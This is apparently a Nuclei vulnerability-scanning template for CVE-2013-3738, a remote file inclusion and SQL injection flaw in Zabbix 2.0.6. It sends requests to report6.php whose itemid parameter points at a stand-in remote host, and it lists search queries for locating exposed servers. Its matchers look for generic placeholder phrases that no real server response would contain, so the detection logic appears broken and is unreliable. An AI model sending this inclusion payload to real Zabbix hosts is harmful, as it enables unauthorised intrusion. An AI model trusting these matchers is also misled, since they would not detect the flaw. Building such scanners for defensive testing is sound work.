id: CVE-2013-3738

info:
  name: Zabbix 2.0.6 Remote File Inclusion and SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: A File Inclusion vulnerability exists in Zabbix 2.0.6 due to inadequate sanitization of request strings in CGI scripts, which could let a remote malicious user execute arbitrary code.
  impact: |
    Successful exploitation could lead to unauthorized access, data leakage, and potential system compromise.
  remediation: |
    Upgrade to a non-vulnerable version of Zabbix (2.0.7 or later) and apply security patches.
  reference:
    - http://support.zabbix.com/browse/ZBX-6652
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2013-3738
    cwe-id: CWE-20
    epss-score: 0.01239
    epss-percentile: 0.86049
    cpe: cpe:2.3:a:zabbix:zabbix:2.0.6:*:*:*:*:*:*:*
  metadata:
    vendor: zabbix
    product: zabbix
    shodan-query: http.title:"zabbix-server"
    fofa-query: app="ZABBIX-监控系统" && body="saml"
    google-query: intitle:"zabbix-server"

http:
  - method: GET
    path:
      - "{{BaseURL}}/report6.php?items[0][itemid]=http://p_lFYrwr.example.com/"
      - "{{BaseURL}}/zabbix/report6.php?items[0][itemid]=http://p_lFYrwr.example.com/"

    headers:
      Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1
      Accept-Language: en
      Connection: Close
      Cookie: zbx_sessionid=d0d318bc93ce17cd3e18822abf1e6538
      User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
      Pragma: no-cache
      Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, /
    matchers:
      - type: word
        words:
          - "Error messages indicating the inclusion of a remote file"
          - "SQL syntax errors"
        part: body
        condition: or
